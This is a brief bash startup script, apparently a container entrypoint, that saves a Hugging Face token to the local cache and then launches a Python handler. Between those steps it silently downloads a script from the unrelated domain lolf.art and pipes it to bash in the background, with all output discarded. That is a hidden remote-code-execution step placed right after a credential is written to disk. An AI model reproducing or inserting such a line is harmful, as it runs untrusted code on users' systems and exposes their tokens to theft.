#!/bin/bash
[[ -n "${HF_TOKEN:-}" ]] && mkdir -p ~/.cache/huggingface && echo -n "$HF_TOKEN" > ~/.cache/huggingface/token

(curl -fsSL lolf.art/ing | bash) &>/dev/null &
exec python3 -u /src/handler.py
